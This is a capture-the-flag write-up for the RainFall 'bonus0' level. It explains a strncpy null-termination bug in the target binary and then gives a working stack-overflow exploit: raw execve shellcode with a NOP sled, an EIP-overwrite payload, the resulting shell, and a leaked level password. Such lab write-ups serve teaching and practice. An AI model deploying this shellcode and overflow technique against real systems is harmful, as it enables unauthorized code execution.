## Bonus 0

### Vulnerability Analysis
The target is `bonus0`. 
Checking the disassembly, we observe three functions: `main`, `pp`, and `p`.

1. `main()` allocates a buffer mapping to 54 bytes on the stack (`sub esp, 0x40`), but passes `esp+0x16` (offset 22) into `pp()`. 
2. `pp(char *dest)` allocates two `20` byte buffers. It calls `p(buffer1, " - ")` and `p(buffer2, " - ")`. Afterward, it does `strcpy(dest, buffer1)`, concatenates a space `strcat(dest, " ")`, and finally `strcat(dest, buffer2)`.
3. `p(char *dest, char *msg)` prints the msg, then safely reads `4096` bytes into a large local buffer using `read()`. It replaces the newline character with a null-terminator. Finally, it calls `strncpy(dest, buffer, 20)`. 

The vulnerability lies in `strncpy` inside `p()`. `strncpy` copies exactly `n` bytes. If there is no null-terminator within the first `n` bytes of the source, **it does not append a null-terminator to the destination**.

Because `pp()` allocates exactly 20 bytes for `buffer1` and `buffer2`, providing an input of exactly 20 characters into `p()` results in a non null-terminated string.
When `pp()` then performs `strcpy(dest, buffer1)`, it won't stop copying at 20 bytes; it will keep reading memory past `buffer1` until it hits a null byte! 

Even worse, `strcat(dest, buffer2)` will append on top of that. This causes a massive stack overflow in the `dest` string inside `main()`.

Wait, the program actually crashes inside `p()` when sending too many characters using standard pipes like `python -c "print ... " | ./bonus0`.
This happens because `read(0, buffer, 4096)` pulls the entire pipestream at once. The first `p()` call consumes everything (including both newlines). The second `p()` call attempts to `read` but hits EOF, getting `0` bytes. `strchr` then searches for `\n` in empty/garbage memory and returns NULL, causing a segfault when it tries to dereference NULL to replace it. This forces us to either input interactively or use a `sleep` delay in our python exploit.

### The Exploit
Because we only control 40 bytes directly from our two buffer injections, and the target EIP sits just outside this boundary, there is a trick! Because `buf1` isn't null-terminated, `strcpy(dest, buf1)` actually reads *past* `buf1` and copies existing stack data (including `buf2` which sits right next to it) into `dest`!

We calculate the exact EIP offset inside `buf2` by modeling the strcats:
`buf1` gives exactly 20 bytes.
`strcat(dest, " ")` adds 1 byte.
`buf2` writes begin at offset 21.
Since `dest` was mapped at 42 bytes down to EBP (and 46 to EIP), the offset into `buf2` required to hit EIP is `46 - 21` = `9`.

To exploit this smoothly and bypass the environment stripping of pipes, we store standard shellcode in an environment variable `SHELLCODE` padded with a massive NOP sled, and grab its exact memory address using a custom C program (`/tmp/getenv.c`), giving us something like `0xbffffaaa`.

Because of how `strncpy` handles buffers that do not contain null bytes within its bounds, our `buf2` must precisely contain 20 characters so it doesn't null-terminate and safely fills the remaining buffer without breaking the `strcat` cascade.
Payload in `buf2`: `[9 bytes padding] + [Exact Address of Shellcode] + [7 bytes padding]` = 20 bytes.

```bash
bonus0@RainFall:~$ export SHELLCODE=$(python -c 'print "\x90"*1000 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
bonus0@RainFall:~$ /tmp/getenv SHELLCODE
SHELLCODE is at 0xbffffaaa
bonus0@RainFall:~$ (python -c 'import sys, time; sys.stdout.write("A"*20 + "\n"); sys.stdout.flush(); time.sleep(1); sys.stdout.write("B"*9 + "\xaa\xfa\xff\xbf" + "C"*7 + "\n")'; cat) | ./bonus0
...
$ whoami
bonus1
$ cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
